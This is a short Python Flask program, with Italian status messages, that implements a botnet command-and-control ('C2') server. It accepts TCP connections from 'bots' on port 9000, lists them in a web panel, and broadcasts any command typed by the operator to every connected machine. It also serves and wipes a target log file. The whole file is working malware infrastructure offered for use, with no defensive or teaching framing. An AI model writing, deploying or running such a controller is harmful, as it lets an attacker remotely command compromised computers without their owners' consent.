import threading
import socket
from flask import Flask, render_template, request, redirect

app = Flask(__name__)

bots = []

def bot_listener():
    HOST = '0.0.0.0'
    PORT = 9000
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as server:
        server.bind((HOST, PORT))
        server.listen()
        print(f"[C2] In ascolto su {HOST}:{PORT}")
        while True:
            conn, addr = server.accept()
            bots.append(conn)
            print(f"[C2] Nuovo bot da {addr}")

@app.route('/')
def index():
    return render_template('index.html', bots=[str(b.getpeername()) for b in bots])

@app.route('/send_command', methods=['POST'])
def send_command():
    cmd = request.form['command']
    for bot in bots:
        try:
            bot.sendall(cmd.encode())
        except:
            bots.remove(bot)
    return redirect('/')

@app.route("/logs")
def logs():
    try:
        with open("/logs/target.log", "r") as f:
            return f.read()[-5000:]
    except FileNotFoundError:
        return "Nessun log ancora."
    
@app.route("/clear_logs", methods=["POST"])
def clear_logs():
    try:
        with open("/logs/target.log", "w") as f:
            f.truncate()
        return "Log cancellati."
    except Exception as e:
        return f"Errore: {str(e)}", 500


if __name__ == "__main__":
    threading.Thread(target=bot_listener, daemon=True).start()
    app.run(host="0.0.0.0", port=5000)
